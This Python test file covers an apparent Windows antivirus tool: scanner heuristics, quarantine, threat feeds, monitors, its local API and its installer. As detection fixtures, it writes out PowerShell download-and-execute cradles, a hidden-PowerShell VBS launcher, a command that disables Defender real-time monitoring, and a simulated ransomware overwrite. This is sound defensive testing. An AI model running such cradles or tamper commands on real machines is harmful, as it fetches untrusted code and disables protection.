"""aureon.defender tests. Everything runs in temp folders with a fake registry; nothing on the real PC changes.

Run:  cd windows && python -m unittest discover -s tests -v
"""
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
import zipfile
from pathlib import Path
from unittest import mock

WIN = Path(__file__).resolve().parent.parent
REPO = WIN.parent
sys.path[:0] = [str(WIN), str(REPO)]
TMP = Path(tempfile.mkdtemp(prefix="aureon-test-"))
os.environ["AUREON_DATA"] = str(TMP / "data")
os.environ["AUREON_USER"] = str(TMP / "user")

from aureon_defender import agent, core, feeds, install, monitors, scanner, studio  # noqa: E402
from aureon_defender.quarantine import Vault  # noqa: E402
from aureon_defender.winmap import WINMAP  # noqa: E402


def motw(path, zone=3):
    with open(str(path) + ":Zone.Identifier", "w") as f:
        f.write(f"[ZoneTransfer]\nZoneId={zone}\nHostUrl=https://example.invalid/x\n")


class Scan(unittest.TestCase):
    def setUp(self):
        self.d = Path(tempfile.mkdtemp(dir=TMP))
        self.rep = scanner.Reputation(self.d / "rep.db")
        self.sc = scanner.Scanner({"use_defender_engine": False, "use_yara": True}, self.rep)

    def f(self, name, data):
        p = self.d / name
        p.write_bytes(data if isinstance(data, bytes) else data.encode())
        return p

    def test_clean_text(self):
        self.assertEqual(self.sc.scan(self.f("notes.txt", "shopping list"))["verdict"], "clean")

    def test_double_extension_script_cradle(self):
        r = self.sc.scan(self.f("invoice.pdf.ps1", "$w=New-Object Net.WebClient; IEX $w.DownloadString('http://x')"))
        self.assertEqual(r["verdict"], "malicious")
        self.assertTrue(any("double extension" in x for x in r["reasons"]))

    def test_rtlo_filename(self):
        r = self.sc.scan(self.f("photo\u202egpj.exe", b"MZ" + b"\0" * 200))
        self.assertIn("right-to-left", " ".join(r["reasons"]))
        self.assertNotEqual(r["verdict"], "clean")

    def test_program_disguised_as_document(self):
        r = self.sc.scan(self.f("report.pdf", b"MZ\x90\x00" + b"\0" * 500))
        self.assertIn("disguised", " ".join(r["reasons"]))
        self.assertEqual(r["verdict"], "suspicious")

    def test_shortcut_launching_powershell(self):
        r = self.sc.scan(self.f("resume.lnk", b"L\0\0\0" + "powershell -w hidden -nop -e ".encode("utf-16-le") + b"\0" * 64))
        self.assertIn("shortcut launches", " ".join(r["reasons"]))
        self.assertIn(r["verdict"], ("suspicious", "malicious"))

    def test_macro_document_from_internet(self):
        p = self.d / "invoice.docm"
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("word/document.xml", "<w/>")
            z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0")
        motw(p)
        r = self.sc.scan(p)
        self.assertIn("macros", " ".join(r["reasons"]))

    def test_zip_with_exe_from_internet(self):
        p = self.d / "photos.zip"
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("photo.scr", b"MZ")
        motw(p)
        self.assertIn("executable content", " ".join(self.sc.scan(p)["reasons"]))

    def test_disk_image_from_internet(self):
        p = self.f("update.iso", b"\0" * 2048)
        motw(p)
        self.assertIn("disk image", " ".join(self.sc.scan(p)["reasons"]))
        q = self.f("local.iso", b"\0" * 2048)              # no Mark-of-the-Web -> not flagged
        self.assertEqual(self.sc.scan(q)["reasons"], [])

    def test_reputation_and_allow_list(self):
        p = self.f("tool.bin", b"aureon unit-test known bad")
        h = scanner.sha256(p)
        self.rep.add_bad([(h, "test", "Test.Bad")])
        self.assertEqual(self.sc.scan(p)["verdict"], "malicious")
        self.rep.allow(h, "my own tool")
        r = self.sc.scan(p)
        self.assertEqual(r["verdict"], "clean")
        self.assertIn("allow-list", r["reasons"][0])

    def test_yara_rules_compile_and_match_if_available(self):
        if not self.sc.yara or not self.sc.yara.rules:
            self.skipTest(getattr(self.sc.yara, "error", "yara off"))
        r = self.sc.scan(self.f("x.txt", "Set-MpPreference -DisableRealtimeMonitoring $true"))
        self.assertIn("Aureon_Defender_Tamper", r["engines"]["yara"])

    def test_defender_engine_on_harmless_file(self):
        if not scanner.mpcmdrun():
            self.skipTest("Defender not present")
        st, _ = scanner.defender_scan(self.f("harmless.txt", "hello"))
        self.assertIn(st, ("clean", "unavailable"))


class QuarantineTest(unittest.TestCase):
    def test_roundtrip_scrambled(self):
        d = Path(tempfile.mkdtemp(dir=TMP))
        v = Vault(d / "q")
        p = d / "evil.exe"
        data = b"MZ" + os.urandom(3000)
        p.write_bytes(data)
        m = v.put(p, {"sha256": "x", "reasons": ["test"], "verdict": "malicious"})
        self.assertFalse(p.exists())
        self.assertNotEqual((d / "q" / f"{m['id']}.bin").read_bytes(), data)      # can't run from the vault
        self.assertEqual(len(v.list()), 1)
        out = v.restore(m["id"])
        self.assertEqual(Path(out).read_bytes(), data)
        self.assertEqual(v.list(), [])


class Feeds(unittest.TestCase):
    def test_parsers(self):
        self.assertEqual(feeds.parse_sha256("# c\n" + "A" * 64 + "\nnope\n"), ["a" * 64])
        self.assertEqual(feeds.parse_ips("# x\n1.2.3.4\n999\n"), ["1.2.3.4"])
        self.assertEqual(feeds.parse_hosts("127.0.0.1 localhost\n127.0.0.1 bad.example.com\n# x"), ["bad.example.com"])

    def test_update_offline_safe_and_feeds_reputation(self):
        d = Path(tempfile.mkdtemp(dir=TMP))
        good = {"malwarebazaar": "b" * 64, "feodo": "5.6.7.8", "urlhaus": "0.0.0.0 evil.example"}

        def fetcher(url):
            for k, v in good.items():
                if feeds.FEEDS[k] == url:
                    return v
        rep = scanner.Reputation(d / "r.db")
        f = feeds.Feeds(d, fetcher)
        self.assertEqual(f.update(rep), {"malwarebazaar": 1, "feodo": 1, "urlhaus": 1})
        self.assertEqual(rep.lookup("b" * 64)[0], "bad")
        self.assertEqual(f.bad_ips(), {"5.6.7.8"})

        def down(url):
            raise OSError("no network")
        f2 = feeds.Feeds(d, down)
        self.assertTrue(all(v.startswith("error") for v in f2.update(rep).values()))
        self.assertEqual(f2.bad_ips(), {"5.6.7.8"})          # cached copy still used offline

    def test_hosts_block_is_reversible(self):
        orig = "# user file\r\n10.0.0.5 nas.home\r\n"
        with_block = feeds.render_hosts(orig, ["evil.example"])
        self.assertIn("0.0.0.0 evil.example", with_block)
        self.assertIn("10.0.0.5 nas.home", with_block)
        self.assertEqual(feeds.render_hosts(with_block, ["other.example"]).count(feeds.BEGIN), 1)
        cleaned = feeds.render_hosts(with_block, [])
        self.assertNotIn("evil.example", cleaned)
        self.assertIn("10.0.0.5 nas.home", cleaned)


class Monitors(unittest.TestCase):
    def test_folder_watch_waits_for_download_to_finish(self):
        d = Path(tempfile.mkdtemp(dir=TMP))
        (d / "old.exe").write_text("existing")
        seen = []
        w = monitors.FolderWatch([str(d)], lambda p: seen.append(p.name))
        w.tick()                                   # primes: existing files ignored
        (d / "new.exe.crdownload").write_text("partial")
        (d / "new.exe").write_text("x")
        w.tick()
        self.assertEqual(seen, [])                 # first sighting -> pending
        w.tick()
        self.assertEqual(seen, ["new.exe"])        # unchanged -> scanned once
        w.tick()
        self.assertEqual(seen, ["new.exe"])

    def test_persistence_diff(self):
        state = {"HKCU\\Run\\OneDrive": "onedrive.exe"}
        p = monitors.Persistence(readers=[lambda: dict(state)], baseline_name="t_persist.json")
        (core.data_dir() / "t_persist.json").unlink(missing_ok=True)
        self.assertEqual(p.tick()[0]["severity"], "info")
        state["HKCU\\Run\\Updater"] = r"C:\Users\x\AppData\Roaming\upd.exe"
        evs = p.tick()
        self.assertEqual([e["severity"] for e in evs], ["medium"])
        self.assertIn("upd.exe", evs[0]["detail"])
        self.assertEqual(p.tick(), [])

    def test_netwatch_c2_and_new_port(self):
        (core.data_dir() / "listening.json").unlink(missing_ok=True)
        (core.data_dir() / "netstate.json").unlink(missing_ok=True)
        conns = [{"status": "ESTABLISHED", "laddr": ("10.0.0.2", 5000), "raddr": ("5.6.7.8", 443), "pid": 42, "proc": "evil.exe"},
                 {"status": "LISTEN", "laddr": ("0.0.0.0", 445), "raddr": None, "pid": 4, "proc": "System"}]
        hosts = ["h1"]
        n = monitors.NetWatch(bad_ips=lambda: {"5.6.7.8"}, conns=lambda: conns, hosts=lambda: hosts[0], dns=lambda: ["1.1.1.1"])
        evs = n.tick()
        self.assertEqual([e["severity"] for e in evs], ["high"])
        self.assertIn("botnet", evs[0]["title"])
        self.assertEqual(n.tick(), [])                       # same connection not re-alerted
        conns.append({"status": "LISTEN", "laddr": ("::", 3389), "raddr": None, "pid": 9, "proc": "svchost.exe"})
        hosts[0] = "h2"
        n.slow_t = 0
        evs = n.tick()
        self.assertEqual(sorted(e["title"] for e in evs), ["New port open to the network: 3389", "The hosts file was changed"])

    def test_canary_fires_names_writer_and_rearms(self):
        d = Path(tempfile.mkdtemp(dir=TMP))
        (core.data_dir() / "canary.json").unlink(missing_ok=True)
        hits = []
        c = monitors.Canary(dirs=[str(d)], top_writers=lambda: [(9_000_000, 77, "crypt.exe", r"C:\x\crypt.exe")], on_hit=hits.append)
        self.assertEqual(c.tick(), [])
        files = list(d.glob("~$aureon-canary-*"))
        self.assertEqual(len(files), 2)
        with open(files[0], "r+b") as fh:          # encrypt in place, like real ransomware
            fh.write(b"ENCRYPTED" * 10)
        evs = c.tick()
        self.assertEqual(evs[0]["severity"], "high")
        self.assertIn("crypt.exe (pid 77", evs[0]["detail"])
        self.assertEqual(len(hits), 1)
        self.assertEqual(c.tick(), [])                       # re-armed

    def test_keyboard_enumeration_is_fast(self):
        t = time.time()
        k = monitors.keyboards_fast()
        self.assertLess(time.time() - t, 0.2)
        self.assertIsInstance(k, dict)


class EngineTest(unittest.TestCase):
    def test_on_file_quarantines_and_inbox_is_restricted(self):
        from aureon_defender.engine import Engine
        d = Path(tempfile.mkdtemp(dir=TMP))
        st = core.Settings(d / "settings.json")
        st.save({"watch_folders": [str(d / "w")], "use_defender_engine": False})
        e = Engine(settings=st, journal=core.Journal(d / "ev.jsonl"))
        (d / "w").mkdir()
        bad = d / "w" / "a.pdf.vbs"
        bad.write_text('CreateObject("WScript.Shell").Run "powershell -w hidden -nop IEX (New-Object Net.WebClient).DownloadString(\'http://x\')"')
        ev = e.on_file(bad)
        self.assertEqual(ev["kind"], "threat")
        self.assertFalse(bad.exists())
        box = core.data_dir() / "inbox"
        box.mkdir(exist_ok=True)
        (box / "1.json").write_text(json.dumps({"type": "set_settings", "realtime": False}))
        (box / "2.json").write_text(json.dumps({"type": "restore", "id": "x"}))
        e.t_inbox()
        self.assertTrue(e.s["realtime"])                     # inbox can't turn protection off
        self.assertEqual(list(box.glob("*.json")), [])

    def test_fast_loop_is_fast(self):
        from aureon_defender.engine import Engine
        d = Path(tempfile.mkdtemp(dir=TMP))
        st = core.Settings(d / "s.json")
        st.save({"watch_folders": [str(d)], "use_defender_engine": False})
        e = Engine(settings=st, journal=core.Journal(d / "ev.jsonl"))
        e.canary.dirs = [d]
        e.run_once("fast")
        t = time.time()
        e.run_once("fast")
        self.assertLess(time.time() - t, 0.5)


class CoreTest(unittest.TestCase):
    def test_settings_reject_unknown_and_wrong_types(self):
        s = core.Settings(TMP / "s2.json")
        out = s.save({"realtime": "no", "evil": 1, "canary": False})
        self.assertTrue(out["realtime"])
        self.assertNotIn("evil", out)
        self.assertFalse(out["canary"])

    def test_journal_filter(self):
        j = core.Journal(TMP / "j.jsonl")
        j.add("info", "x", "a")
        j.add("high", "x", "b")
        self.assertEqual([e["title"] for e in j.recent(min_sev="medium")], ["b"])

    def test_installed_data_dir_is_shared_even_when_read_only(self):
        pd = Path(tempfile.mkdtemp(dir=TMP))
        (pd / "Aureon" / "inbox").mkdir(parents=True)
        env = {k: v for k, v in os.environ.items() if k != "AUREON_DATA"}
        env["PROGRAMDATA"] = str(pd)
        with mock.patch.dict(os.environ, env, clear=True), mock.patch.object(core, "_writable", lambda p: False):
            self.assertEqual(core.data_dir(), pd / "Aureon")      # users read the engine's status, not a private copy

    def test_expand_all_for_system(self):
        with mock.patch.dict(os.environ, {"AUREON_ALL_USERS": "1"}):
            paths = core.expand_all("~/Downloads")
        self.assertTrue(all(p.name == "Downloads" for p in paths))
        self.assertGreaterEqual(len(paths), 1)


class StudioTest(unittest.TestCase):
    def mk(self):
        d = Path(tempfile.mkdtemp(dir=TMP))
        reg = studio.MemReg({(studio.PERSONALIZE, "AppsUseLightTheme"): (1, 4)})
        return studio.Studio(reg=reg, backup=d / "b.json", apply_wallpaper=lambda p: setattr(self, "wp", p), live=False), reg, d

    def test_accent_encoding(self):
        self.assertEqual(studio.abgr_dword("#3ddc97"), 0xFF97DC3D)

    def test_set_and_restore_exactly(self):
        s, reg, _ = self.mk()
        s.set_theme("dark", "dark")
        s.set_accent("#ff8a5c")
        s.set_taskbar("left", True)
        s.set_time_format(24, "dd/MM/yyyy")
        c = s.current()
        self.assertEqual((c["apps"], c["accent"], c["taskbar"], c["seconds"], c["time"], c["date"]),
                         ("dark", "#ff8a5c", "left", True, "HH:mm", "dd/MM/yyyy"))
        s.set_theme("light", "light")                     # second change must not overwrite the original in the backup
        s.restore()
        self.assertEqual(reg.data, {(studio.PERSONALIZE, "AppsUseLightTheme"): (1, 4)})

    def test_preset_generates_wallpaper_and_widget(self):
        s, reg, d = self.mk()
        out = s.apply_preset("Hearth", 160, 90, out_dir=d)
        self.assertTrue(Path(out["wallpaper"]).exists())
        self.assertEqual(self.wp, out["wallpaper"])
        self.assertEqual(out["widget"]["font"], "Georgia")
        self.assertEqual(s.current()["accent"], "#d9944a")

    def test_all_presets_render(self):
        d = Path(tempfile.mkdtemp(dir=TMP))
        from PIL import Image
        for n, p in studio.PRESETS.items():
            f = studio.generate_wallpaper(p["wallpaper"], p["palette"], 128, 72, d / f"{n}.png")
            self.assertEqual(Image.open(f).size, (128, 72))

    def test_font_type_check(self):
        s, _, d = self.mk()
        with self.assertRaises(ValueError):
            s.install_font(d / "x.exe")


class AgentApi(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        d = Path(tempfile.mkdtemp(dir=TMP))
        st = studio.Studio(reg=studio.MemReg(), backup=d / "b.json", apply_wallpaper=lambda p: None, live=False)
        cls.api = agent.Api(studio=st, journal=core.Journal(d / "ev.jsonl"), settings=core.Settings(d / "s.json"),
                            vault=Vault(d / "q"), elevate=lambda a: False)
        cls.srv, cls.info = agent.serve(cls.api)
        cls.base = f"http://127.0.0.1:{cls.info['port']}"

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()

    def req(self, path, body=None, token=True, host=None, ctype="application/json"):
        import urllib.request
        h = {"Content-Type": ctype}
        if token:
            h["X-Aureon-Token"] = self.info["token"]
        if host:
            h["Host"] = host
        r = urllib.request.Request(self.base + path, data=json.dumps(body).encode() if body is not None else None, headers=h,
                                   method="POST" if body is not None else "GET")
        try:
            with urllib.request.urlopen(r, timeout=30) as resp:
                return resp.status, resp.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()

    def test_security(self):
        self.assertEqual(self.req("/api/state", token=False)[0], 403)
        self.assertEqual(self.req("/api/state", host="evil.example:80")[0], 403)                 # DNS rebinding
        self.assertEqual(self.req("/api/studio/restore", {}, ctype="text/plain")[0], 403)          # cross-site form post
        self.assertEqual(self.req("/?t=wrong", token=False)[0], 403)
        code, html = self.req(f"/?t={self.info['token']}", token=False)
        self.assertEqual(code, 200)
        self.assertIn(self.info["token"].encode(), html)

    def test_state_and_studio_flow(self):
        code, raw = self.req("/api/state")
        st = json.loads(raw)
        self.assertEqual(set(st["presets"]), set(studio.PRESETS))
        self.assertIn("engine", st["winmap"])
        code, raw = self.req("/api/studio/set", {"theme": "dark", "accent": "#123456", "taskbar": "left", "hours": 12})
        cur = json.loads(raw)
        self.assertEqual((cur["apps"], cur["accent"], cur["taskbar"], cur["time"]), ("dark", "#123456", "left", "h:mm tt"))
        code, raw = self.req("/api/studio/restore", {})
        self.assertGreater(json.loads(raw)["restored"], 0)
        self.assertEqual(self.req("/api/studio/preset", {"name": "Nope"})[0], 400)
        code, raw = self.req("/api/widget", {"position": "center", "evil": 1})
        w = json.loads(raw)
        self.assertEqual(w["position"], "center")
        self.assertNotIn("evil", w)

    def test_quarantine_id_validation_and_scan(self):
        self.assertEqual(self.req("/api/quarantine/restore", {"id": "../../x"})[0], 400)
        self.assertEqual(self.req("/api/scan", {"path": str(TMP / "does-not-exist")})[0], 400)

    def test_follower_toasts_and_locks(self):
        j = core.Journal(TMP / "follow.jsonl")
        j.add("info", "x", "old")
        shown, locks = [], []
        f = agent.Follower(j, notify=lambda t, b: shown.append(t), lock=lambda: locks.append(1))
        j.add("info", "x", "quiet")
        j.add("high", "usb", "New keyboard", "d", lock=True)
        f.poll()
        self.assertEqual(shown, ["⚠ New keyboard"])
        self.assertEqual(locks, [1])
        self.assertEqual(f.poll(), [])


class Mapping(unittest.TestCase):
    def test_winmap_covers_all_53_capabilities(self):
        caps = {c["id"] for c in json.loads((REPO / "capabilities.json").read_text(encoding="utf-8"))}
        self.assertEqual(set(WINMAP), caps)
        self.assertTrue(all(v[0] in {"engine", "studio", "app", "node", "branch", "n/a"} for v in WINMAP.values()))


class Packaging(unittest.TestCase):
    def test_task_script_is_resilient(self):
        s = install.task_script(r"C:\Program Files\Aureon\aureon.defender.exe")
        for must in ("-RestartCount 999", "ExecutionTimeLimit ([TimeSpan]::Zero)", "-AllowStartIfOnBatteries", "S-1-5-18",
                     "-AtStartup", "-AtLogOn", "'C:\\Program Files\\Aureon\\aureon.defender.exe'"):
            self.assertIn(must, s)

    def test_installer_only_stops_installed_copies(self):
        d = Path(tempfile.mkdtemp(dir=TMP))
        inst = d / "Program Files" / "Aureon"
        inst.mkdir(parents=True)
        decoy = inst / "aureon.defender.exe"
        ping = Path(os.environ.get("SYSTEMROOT", r"C:\Windows")) / "System32" / "PING.EXE"
        shutil.copy(ping, decoy)                               # a long-running process from the "installed" folder
        p = subprocess.Popen([str(decoy), "-n", "60", "127.0.0.1"], stdout=subprocess.DEVNULL, creationflags=0x08000000)
        try:
            time.sleep(1)
            stopped = install.stop_installed_copies(target=inst, me=p.pid)     # pretend the decoy is the installer
            self.assertEqual(stopped, [])                                      # never stops itself
            stopped = install.stop_installed_copies(target=inst)
            self.assertEqual(stopped, [p.pid])                                 # stops the installed copy only
            p.wait(timeout=10)
        finally:
            if p.poll() is None:
                p.kill()

    def test_data_acl_users_read_only_except_inbox(self):
        cmds = install.acl_commands(Path(r"C:\ProgramData\Aureon"))
        self.assertIn("*S-1-5-32-545:(OI)(CI)RX", cmds[0])
        self.assertTrue(cmds[1][1].endswith("inbox"))

    def test_powershell_parses_task_script(self):
        s = install.task_script(r"C:\Program Files\Aureon\aureon.defender.exe")
        f = TMP / "t.ps1"
        f.write_text(s, encoding="utf-8")
        r = subprocess.run(["powershell", "-NoProfile", "-Command",
                            f"$e=$null;[System.Management.Automation.Language.Parser]::ParseFile('{f}',[ref]$null,[ref]$e)|Out-Null;$e.Count"],
                           capture_output=True, text=True)
        self.assertEqual(r.stdout.strip(), "0")

    def test_cli_scan_exit_codes(self):
        d = Path(tempfile.mkdtemp(dir=TMP))
        (d / "ok.txt").write_text("hello")
        env = dict(os.environ, PYTHONPATH=f"{WIN}{os.pathsep}{REPO}")
        r = subprocess.run([sys.executable, "-m", "aureon_defender", "scan", str(d)], capture_output=True, text=True, env=env, cwd=WIN)
        self.assertEqual(r.returncode, 0, r.stderr)
        (d / "a.pdf.ps1").write_text("IEX (New-Object Net.WebClient).DownloadString('http://x')")
        r = subprocess.run([sys.executable, "-m", "aureon_defender", "scan", str(d)], capture_output=True, text=True, env=env, cwd=WIN)
        self.assertEqual(r.returncode, 3)
        self.assertIn("double extension", r.stdout)


def tearDownModule():
    shutil.rmtree(TMP, ignore_errors=True)


if __name__ == "__main__":
    unittest.main()
